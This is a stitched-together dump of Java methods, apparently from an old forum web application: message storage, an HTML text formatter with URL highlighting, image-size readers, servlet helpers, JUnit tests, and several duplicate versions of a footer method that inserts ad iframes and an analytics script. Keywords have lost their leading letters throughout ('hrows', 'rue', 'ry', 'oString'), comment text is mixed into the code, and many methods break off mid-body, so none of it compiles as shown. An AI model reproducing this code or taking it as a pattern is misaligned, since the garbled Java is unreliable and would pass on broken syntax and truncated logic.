public static void main ( String [ ] args ) hrows Exception { Hashtable defaults = getDefaultProfile ( ) ; FileOutputStream f = new FileOutputStream ( " anonymous " ) ; ObjectOutputStream o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _search " ) ; defaults . put ( " SearchMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _debug " ) ; defaults . put ( " DebugMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white2 " ) ; defaults . put ( " style " , " white2 " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white " ) ; defaults . put ( " style " , " white " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; } 
Connection getConnection ( String user ) hrows SQLException ; void SQLclose ( ) hrows SQLException ; } 
protected String readMessageImpl ( String domain , String msgid ) hrows IOException , StorageNotFoundException { BufferedReader in = null ; ry { in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( root + domain + '/' + msgid ) , " KOI8-R " ) ) ; } catch ( FileNotFoundException e ) { hrow new StorageNotFoundException ( domain , msgid , e ) ; } char [ ] buf = new char [ 8192 ] ; StringBuffer out = new StringBuffer ( ) ; int i = 0 ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . oString ( ) ; } 
protected void writeMessageImpl ( String domain , String msgid , String message ) hrows IOException , StorageException { if ( new File ( root + domain + '/' + msgid ) . exists ( ) ) { hrow new StorageExistsException ( domain , msgid ) ; } FileOutputStream out = new FileOutputStream ( root + domain + '/' + msgid ) ; out . write ( message . getBytes ( " KOI8-R " ) ) ; out . close ( ) ; } 
protected void updateMessageImpl ( String domain , String msgid , String message ) hrows IOException , StorageException { if ( ! ( new File ( root + domain + '/' + msgid ) . exists ( ) ) ) { hrow new StorageNotFoundException ( domain , msgid ) ; } FileOutputStream out = new FileOutputStream ( root + domain + '/' + msgid ) ; out . write ( message . getBytes ( " KOI8-R " ) ) ; out . close ( ) ; } 
protected InputStream getReadStreamImpl ( String domain , String msgid ) hrows StorageNotFoundException { FileInputStream in = null ; TODO: try buffered input stream and check perfomance try { in = new FileInputStream(root + domain + '/' + msgid); } catch (FileNotFoundException e) { throw new StorageNotFoundException(domain, msgid); } return in; } 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) hrows IOException { FileOutputStream in = null ; in = new FileOutputStream ( root + domain + '/' + msgid ) ; return in ; } 
public String readMessage ( String domain , String msgid ) hrows IOException , StorageException { check ( domain , msgid ) ; return readMessageImpl ( domain , msgid ) ; } 
public String readMessageNull ( String domain , String msgid ) hrows IOException , StorageException { check ( domain , msgid ) ; return readMessageNullImpl ( domain , msgid ) ; } 
public String readMessageDefault ( String domain , String msgid , String def ) hrows IOException , StorageException { check ( domain , msgid ) ; return readMessageDefaultImpl ( domain , msgid , def ) ; } 
public void writeMessage ( String domain , String msgid , String message ) hrows IOException , StorageException { check ( domain , msgid ) ; writeMessageImpl ( domain , msgid , message ) ; } 
public void updateMessage ( String domain , String msgid , String message ) hrows IOException , StorageException { check ( domain , msgid ) ; updateMessageImpl ( domain , msgid , message ) ; } 
public InputStream getReadStream ( String domain , String msgid ) hrows StorageException { check ( domain , msgid ) ; return getReadStreamImpl ( domain , msgid ) ; } 
public OutputStream getWriteStream ( String domain , String msgid ) hrows IOException , StorageException { check ( domain , msgid ) ; return getWriteStreamImpl ( domain , msgid ) ; } 
private void check ( String domain , String msgid ) hrows StorageException { ry { if ( DomainCheckRE = = null ) { 
protected String readMessageImpl ( String domain , String msgid ) hrows IOException , StorageException { hrow new StorageNotImplException ( ) ; } 
protected String readMessageNullImpl ( String domain , String msgid ) hrows IOException , StorageException { ry { return readMessageImpl ( domain , msgid ) ; 
protected String readMessageDefaultImpl ( String domain , String msgid , String def ) hrows IOException , StorageException { ry { return readMessageImpl ( domain , msgid ) ; 
protected void writeMessageImpl ( String domain , String msgid , String message ) hrows IOException , StorageException { hrow new StorageNotImplException ( ) ; } 
protected void updateMessageImpl ( String domain , String msgid , String message ) hrows IOException , StorageException { hrow new StorageNotImplException ( ) ; } 
protected InputStream getReadStreamImpl ( String domain , String msgid ) hrows StorageException { hrow new StorageNotImplException ( ) ; } 
protected OutputStream getWriteStreamImpl ( String domain , String msgid ) hrows IOException , StorageException { hrow new StorageNotImplException ( ) ; } 
public static String getMonth ( int month ) hrows BadDateException { switch ( month - 1 ) { case 0 : 
public static String readfile ( String filename ) hrows IOException { StringBuffer out = new StringBuffer ( ) ; BufferedReader in = new BufferedReader ( new InputStreamReader ( new FileInputStream ( filename ) , " KOI8-R " ) ) ; char [ ] buf = new char [ 8192 ] ; int i = 0 ; while ( ( i = in . read ( buf , 0 , buf . length ) ) > - 1 ) { if ( i > 0 ) { out . append ( buf , 0 , i ) ; } } in . close ( ) ; return out . oString ( ) ; } 
public String process ( ) hrows UtilException { if ( CheckHTML ) { checkHTML ( ) ; } StringTokenizer st ; if ( PlainText ) { st = new StringTokenizer ( htmlSpecialChars ( ext ) , delim , rue ) ; } else { st = new StringTokenizer ( ext , delim , rue ) ; } StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
public void enableUrlHighLightMode ( ) { urlHighlight = rue ; } 
public void enablePreformatMode ( ) { Preformat = rue ; nl = " " ; delim = " " ; } 
public void enableNewLineMode ( ) { NewLine = rue ; exNewLine = false ; } 
public void enableTexNewLineMode ( ) { NewLine = false ; exNewLine = rue ; } 
public void enablePlainTextMode ( ) { PlainText = rue ; CheckHTML = false ; } 
public void enableCheckHTML ( ) { CheckHTML = rue ; PlainText = false ; } 
private String formatHTMLLine ( String chunk ) { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL index = found.getStartIndex(); int end = found.getEndIndex(); String url = chunk.substring(index, end); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, index); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"" + url + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = end; } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String nl2br ( String ext ) { return nlRE . substituteAll ( ext , " <br> " ) ; } 
public static String exnl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return exnlRE . substituteAll ( ext , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuffer res = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : res . append ( " &amp; " ) ; break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
private void checkHTML ( ) hrows UtilException { String str ; if ( ! urlHighlight ) { str = agREAnchor . substituteAll ( ext , " " ) ; } else { str = agRE . substituteAll ( ext , " " ) ; } if ( str . indexOf ( '<' ) ! = - 1 | | str . indexOf ( '>' ) ! = - 1 ) { hrow new UtilBadHTMLException ( ) ; 
public static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuffer sb = new StringBuffer ( ) ; start = start % maxlength ; int pices = ( start + line . length ( ) ) / maxlength ; for ( int i = 0 ; i < pices ; i + + ) { if ( i = = 0 ) { sb . append ( line . substring ( 0 , ( i + 1 ) * maxlength - start ) ) ; } else { sb . append ( line . substring ( maxlength * i - start , ( i + 1 ) * maxlength - start ) ) ; } sb . append ( delim ) ; } if ( pices = = 0 ) { sb . append ( line ) ; } else { sb . append ( line . substring ( maxlength * pices - start ) ) ; } return sb . oString ( ) ; } 
public static String wrapLongLine ( String line , int maxlength , String delim ) { return wrapLongLine ( line , maxlength , delim , 0 ) ; } 
public static String wrapLongLines ( String ext , int maxlength ) { StringTokenizer st = new StringTokenizer ( ext , " " , rue ) ; StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( wrapLongLine ( st . nextToken ( ) , maxlength , " " ) ) ; } return sb . oString ( ) ; } 
public static void main ( String [ ] args ) hrows Exception { ImageInfo info = new ImageInfo ( args [ 0 ] ) ; if ( info . width > info . height ) { System . out . print ( " horizontal " ) ; } else { System . out . print ( " vertical " ) ; } System . out . println ( info . width + " " + info . height ) ; } 
private void getGifInfo ( FileInputStream fileStream ) hrows IOException , BadImageException { byte [ ] bytes = new byte [ 13 ] ; int bytesread = fileStream . read ( bytes ) ; if ( bytesread = = 13 ) { String header = new String ( bytes ) ; 
private void getPngInfo ( FileInputStream fileStream ) hrows IOException , BadImageException { byte [ ] bytes = new byte [ 24 ] ; int bytesread = fileStream . read ( bytes ) ; if ( bytesread = = 24 ) { String header = new String ( bytes ) ; 
private void getJpgInfo ( FileInputStream fileStream ) hrows IOException , BadImageException { if ( fileStream . read ( ) = = 0xFF & & fileStream . read ( ) = = 0xD8 ) { while ( rue ) { 
private short shortBigEndian ( byte firstRead , byte lastRead ) { return ( short ) ( ( ( firstRead & 0xFF ) < < 8 ) | lastRead & 0xFF ) ; } 
private short shortLittleEndian ( byte firstRead , byte lastRead ) { return shortBigEndian ( lastRead , firstRead ) ; } 
private int intBigEndian ( byte a1 , byte a2 , byte a3 , byte a4 ) { return ( ( a1 & 0xFF ) < < 24 ) | ( ( a2 & 0xFF ) < < 16 ) | ( ( a3 & 0xFF ) < < 8 ) | a4 & 0xFF ; } 
private int intLittleEndian ( byte a1 , byte a2 , byte a3 , byte a4 ) { return intBigEndian ( a4 , a3 , a2 , a1 ) ; } 
public boolean getBooleanProperty ( String prop ) hrows UtilException { if ( settings . get ( prop ) ! = null ) { return ( ( Boolean ) settings . get ( prop ) ) . booleanValue ( ) ; 
public String getBooleanPropertyHTML ( String prop ) hrows UtilException { return getBooleanProperty ( prop ) ? " checked " : " " ; } 
public boolean setBooleanProperty ( String prop , String value ) hrows UtilException { if ( value = = null ) { return setBooleanProperty ( prop , Boolean . FALSE ) ; } if ( " on " . equals ( value ) ) { return setBooleanProperty ( prop , Boolean . TRUE ) ; } return false ; } 
public String getString ( String name ) hrows ServletParameterException { if ( name = = null ) throw new ServletParameterBadNameException ( name ) ; String value = rq . getParameter ( name ) ; if ( value = = null ) throw new ServletParameterMissingException ( name ) ; return value ; } 
public int getInt ( String name ) hrows ServletParameterException { if ( name = = null ) throw new ServletParameterBadNameException ( name ) ; String svalue = rq . getParameter ( name ) ; if ( svalue = = null ) throw new ServletParameterMissingException ( name ) ; int value ; try { value = Integer . parseInt ( svalue ) ; } catch ( NumberFormatException e ) { throw new ServletParameterBadValueException ( name , e ) ; } return value ; } 
public boolean getBoolean ( String name ) hrows ServletParameterException { int value = getInt ( name ) ; switch ( value ) { case 0 : return false ; 
public static boolean checkLoginName ( String login ) { login = login . oLowerCase ( ) ; no zerosize login if (login.length() == 0) { return false; } if (login.length() >= 80) { return false; } return loginCheckRE.isMatch(login); } 
public static String makeTitle ( String itle ) { if ( itle ! = null & & ! " " . equals ( itle . rim ( ) ) ) { return itle ; } return " " ; } 
public static String getStackTrace ( Throwable e ) hrows IOException { StringWriter str = new StringWriter ( ) ; PrintWriter prt = new PrintWriter ( str ) ; e . printStackTrace ( prt ) ; String r = str . oString ( ) ; prt . close ( ) ; str . close ( ) ; return r ; } 
public static boolean isSearchEnguine ( String UserAgent ) { boolean r = false ; if ( UserAgent ! = null ) { UserAgent = UserAgent . oLowerCase ( ) ; if ( UserAgent . indexOf ( " htdig " ) ! = - 1 ) { r = rue ; } if ( UserAgent . indexOf ( " udmsearch " ) ! = - 1 ) { r = rue ; } } return r ; } 
public static String md5hash ( String pass ) { ry { MessageDigest md = MessageDigest . getInstance ( " MD5 " ) ; $NON-NLS-1$ 
public static String fixURL ( String url ) hrows UtilException { url = url . rim ( ) ; if ( IsItUrl ( url ) ) { if ( url . oLowerCase ( ) . startsWith ( " www. " ) ) { return " http: " + url ; } if ( url . oLowerCase ( ) . startsWith ( " ftp. " ) ) { return " ftp: " + url ; } return url ; } hrow new UtilBadURLException ( url ) ; } 
private static boolean IsItUrl ( String x ) { return isUrl . isMatch ( x ) ; } 
public static void main ( String [ ] args ) { ry { for ( int i = 0 ; i < args . length ; i + + ) { 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <iframe src= \" dw.jsp?width=400&amp;height=155&amp;main=t \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <iframe src= \" dw.jsp?width=400&amp;height=155&amp;main=0 \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <iframe src= \" dw.jsp?width=468&amp;height=60&amp;main=0 \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=468&amp;height=60&amp;main=0 \" width= \" 468 \" height= \" 60 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public static String htmlSpecialChars ( String str ) { StringBuffer res = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : REMatch m = uniRE . getMatch ( str . substring ( i ) ) ; if ( ( m instanceof REMatch ) ) { String s = m . oString ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) hrows UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) + " &topics= " + prof . getIntProperty ( " opics " ) + " &messages= " + prof . getIntProperty ( " messages " ) + " &style= " + prof . getStringProperty ( " style " ) ; } 
public String process ( ) hrows UtilException { if ( htmlInput ) { checkHTML ( ) ; } StringTokenizer st ; if ( plainTextInput ) { st = new StringTokenizer ( htmlSpecialChars ( ext ) , delim , rue ) ; } else { st = new StringTokenizer ( ext , delim , rue ) ; } StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
public void enablePlainTextMode ( ) { plainTextInput = rue ; htmlInput = false ; } 
public void enableCheckHTML ( ) { htmlInput = rue ; plainTextInput = false ; } 
private String formatHTMLLine ( String chunk ) hrows UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"" + url + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static int countCharacters ( String str ) hrows UtilException { int size = 0 ; ry { for ( Iterator i = new SGMLStringIterator ( str ) ; i . hasNext ( ) ; ) { i . next ( ) ; size + + ; } } catch ( StringIndexOutOfBoundsException ex ) { hrow new UtilException ( " Invalid SGML Entity " ) ; } return size ; } 
private void checkHTML ( ) hrows UtilBadHTMLException { String str ; if ( ! urlHighlight ) { str = agREAnchor . substituteAll ( ext , " " ) ; } else { str = agRE . substituteAll ( ext , " " ) ; } if ( str . indexOf ( '<' ) ! = - 1 | | str . indexOf ( '>' ) ! = - 1 ) { hrow new UtilBadHTMLException ( ) ; 
public static String wrapLongLine ( String line , int maxlength , String delim , int start ) hrows UtilException { StringBuffer sb = new StringBuffer ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . oString ( ) ; } 
public static String wrapLongLine ( String line , int maxlength , String delim ) hrows UtilException { return wrapLongLine ( line , maxlength , delim , 0 ) ; } 
public static String wrapLongLines ( String ext , int maxlength ) hrows UtilException { StringTokenizer st = new StringTokenizer ( ext , " " , rue ) ; StringBuffer sb = new StringBuffer ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( wrapLongLine ( st . nextToken ( ) , maxlength , " " ) ) ; } return sb . oString ( ) ; } 
public void estURLHighlight ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT1 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( formatter . process ( ) , RESULT1 ) ; } 
public void estURLHighlight2 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT2 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( formatter . process ( ) , RESULT2 ) ; } 
public void estURLHighlight3 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT3 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( formatter . process ( ) , RESULT3 ) ; } 
public void estWrap1 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT4 ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( RESULT4 , formatter . process ( ) ) ; } 
public void estCountSGML1 ( ) hrows UtilException { assertEquals ( HTMLFormatter . countCharacters ( TEXT4 ) , TEXT4 . length ( ) ) ; } 
public void estCountSGML2 ( ) hrows UtilException { assertEquals ( 5 , HTMLFormatter . countCharacters ( TEXT6 ) ) ; } 
public void estWrapSGML ( ) hrows UtilException { assertEquals ( TEXT7 , HTMLFormatter . wrapLongLine ( TEXT7 , 35 , " " ) ) ; } 
public void estWrapSGML2 ( ) hrows UtilException { assertEquals ( RESULT7 , HTMLFormatter . wrapLongLine ( TEXT7 , 20 , " " ) ) ; } 
public void remove ( ) { hrow new UnsupportedOperationException ( ) ; } 
public boolean hasNext ( ) { return index < str . length ( ) ; } 
public Object next ( ) { if ( ! hasNext ( ) ) { hrow new NoSuchElementException ( ) ; } if ( str . charAt ( index ) = = '&' ) { StringBuffer buf = new StringBuffer ( ) ; 
public void checkDuplication ( String ip ) hrows DuplicationException { if ( ! check ( ip ) ) { hrow new DuplicationException ( ) ; 
private String formatHTMLLine ( String chunk ) hrows UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"" + htmlSpecialChars(url) + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public void estURLHighlight4 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT8 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( formatter . process ( ) , RESULT8 ) ; } 
public void estURLHighlight4 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT8 ) ; formatter . enablePlainTextMode ( ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( formatter . process ( ) , RESULT8 ) ; } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public abstract String getContent ( String name , ProfileHashtable profile ) hrows IOException , BoxletException , UtilException ; public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) hrows IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) hrows BoxletException ; } 
